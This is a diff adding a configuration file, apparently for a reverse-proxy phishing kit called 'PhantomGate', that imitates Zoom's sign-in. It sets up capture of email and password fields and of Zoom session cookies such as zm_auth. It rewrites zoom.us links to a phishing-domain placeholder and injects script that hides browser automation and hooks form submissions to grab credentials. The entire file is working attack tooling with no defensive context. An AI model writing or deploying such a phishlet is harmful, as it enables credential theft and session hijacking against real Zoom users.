@@ -1,0 +1,65 @@
+name: Zoom
+author: PhantomGate
+version: 2.0.0
+description: Zoom authentication - Pixel-perfect replica
+
+auth:
+  domains:
+    - zoom.us
+    - profile.zoom.us
+    - sso.zoom.us
+  
+  login:
+    domain: zoom.us
+    path: /signin
+    username:
+      selector: "input#email"
+      capture: true
+    password:
+      selector: "input#password"
+      capture: true
+  
+  tokens:
+    cookies:
+      - name: _zm_serial
+        regex: ".*"
+      - name: _zm_page_id
+        regex: ".*"
+      - name: zm_auth
+        regex: ".*"
+      - name: zm_perf
+        regex: ".*"
+      - name: _zm_chat_slug
+        regex: ".*"
+
+proxy:
+  hosts:
+    - domain: zoom.us
+      inject: true
+    - domain: profile.zoom.us
+      inject: true
+  
+  sub_filters:
+    - domain: zoom.us
+      search: "https://zoom.us"
+      replace: "https://{phishing_domain}"
+
+injection:
+  js: |
+    // PhantomGate Injection - Zoom
+    (function() {
+      'use strict';
+      
+      // Override navigator properties
+      Object.defineProperty(navigator, 'webdriver', {get: () => false});
+      
+      // Capture form submissions
+      document.addEventListener('submit', function(e) {
+        var form = e.target;
+        var username = form.querySelector('#email');
+        var password = form.querySelector('#password');
+        if (username && password) {
+          console.log('[PhantomGate] Zoom credentials captured');
+        }
+      }, true);
+    })();
